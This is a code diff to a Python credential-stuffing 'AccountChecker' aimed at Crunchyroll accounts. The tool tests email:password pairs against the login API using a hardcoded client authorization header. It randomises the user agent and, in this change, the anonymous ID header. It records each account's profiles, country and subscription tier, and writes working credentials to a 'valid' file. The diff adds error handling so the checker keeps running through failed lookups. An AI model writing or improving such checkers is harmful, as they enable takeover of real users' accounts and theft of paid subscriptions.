@@ -100,7 +100,7 @@ class AccountChecker:
         'authorization': 'Basic ZG1yeWZlc2NkYm90dWJldW56NXo6NU45aThPV2cyVmtNcm1oekNfNUNXekRLOG55SXo0QU0=',
         'connection': 'Keep-Alive',
         'content-type': 'application/x-www-form-urlencoded',
-        'etp-anonymous-id': '71166ae5-eeb0-46a6-a320-84f90463fd1a',
+        'etp-anonymous-id': str(uuid.uuid4()),
         'host': 'www.crunchyroll.com',
         'user-agent': Miscellaneous().randomize_user_agent(),
         'x-datadog-sampling-priority': '0',
@@ -176,27 +176,38 @@ class AccountChecker:
 
     @debug
     def get_capture(self) -> tuple[int, str, str, str] | None:
-        response = self.session.get('https://www.crunchyroll.com/accounts/v1/me/multiprofile')
-        debug_response(response)
+        try:
+            response = self.session.get('https://www.crunchyroll.com/accounts/v1/me/multiprofile')
+            debug_response(response)
 
-        if response.status_code == 200:
-            json = response.json()
-            profiles = json.get("profiles", [])
-            
-            if profiles:
-                first_profile = profiles[0]
-                num_profiles = len(profiles)
-                account_id = first_profile.get("profile_id")
-                username = first_profile.get("username", "")
-                extended_ratings = first_profile.get("extended_maturity_rating", {})
-                country = next(iter(extended_ratings.keys())) if extended_ratings else ""
-                
-                return num_profiles, account_id, username, country
+            if response.status_code == 404:
+                log.warning("Multiprofile endpoint not found, account may be restricted or unverified.")
+                return (1, "unknown", "unknown", "unknown")
 
-        else:
+            if response.status_code == 200:
+                try:
+                    json = response.json()
+                    profiles = json.get("profiles", [])
+                    
+                    if profiles:
+                        first_profile = profiles[0]
+                        num_profiles = len(profiles)
+                        account_id = first_profile.get("profile_id")
+                        username = first_profile.get("username", "")
+                        extended_ratings = first_profile.get("extended_maturity_rating", {})
+                        country = next(iter(extended_ratings.keys())) if extended_ratings else ""
+                        
+                        return num_profiles, account_id, username, country
+                except (ValueError, KeyError) as e:
+                    log.error(f"Failed to parse profile response: {e}")
+                    return (1, "unknown", "unknown", "unknown")
+
             log.error(f"Failed to check account: {response.text} {response.status_code}")
-        
-        return None
+            return (1, "unknown", "unknown", "unknown")
+            
+        except Exception as e:
+            log.error(f"Error getting profile info: {e}")
+            return (1, "unknown", "unknown", "unknown")
 
     @debug
     def check_subscription(self, extra_id: int) -> str:
@@ -225,6 +236,8 @@ class AccountChecker:
                 return "Mega Pack"
             else:
                 return "Unknown"
+        elif response.status_code == 404:
+            return "Free"
         else:
             log.error(f"Failed to check subscription: {response.text} {response.status_code}")
         
@@ -258,9 +271,14 @@ def check_account(credentials: str) -> bool:
             
             if external_id:
                 subscription = Account_Checker.check_subscription(external_id)
-
-                profile_number, account_id, username, country = Account_Checker.get_capture()
                 
+                # Get profile info, falling back to defaults if unavailable
+                profile_info = Account_Checker.get_capture()
+                if not profile_info:
+                    profile_info = (1, "unknown", "unknown", "unknown")
+                    
+                profile_number, account_id, username, country = profile_info
+
                 with open("output/valid/valid.txt", "a") as f:
                     f.write(f"{email}:{password}\n")
                 
